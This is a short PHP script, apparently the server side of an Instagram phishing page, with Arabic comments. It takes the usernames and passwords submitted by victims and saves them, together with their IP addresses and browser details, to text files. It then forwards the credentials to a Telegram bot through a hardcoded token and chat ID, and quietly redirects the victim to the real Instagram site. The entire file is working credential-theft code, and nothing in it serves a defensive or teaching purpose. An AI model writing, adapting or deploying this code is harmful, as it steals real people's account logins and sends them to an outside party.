<?php
// إعدادات Telegram
$botToken = '5984403789:AAG0N8ThL71h4mIxPuIb4F863OyZurWBM8A';
$chatId = '5322402925'; // تم تعيينه

// تضمين معالج Telegram
require_once('../../telegram_handler.php');

// الحفظ في الملفات (الطريقة الأصلية)
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents("ip.txt", "IP: " . $_SERVER['REMOTE_ADDR'] . " User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . " Date: " . date("D M d, Y g:i a") . "\n", FILE_APPEND);

// إرسال إلى Telegram (إذا تم تعيين Chat ID)
if (!empty($chatId)) {
    $username = $_POST['username'] ?? 'غير متاح';
    $password = $_POST['password'] ?? 'غير متاح';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';

    logCredentials('Instagram', $username, $password, $ip, $botToken, $chatId);
}

header('Location: https://www.instagram.com/');
exit();
?>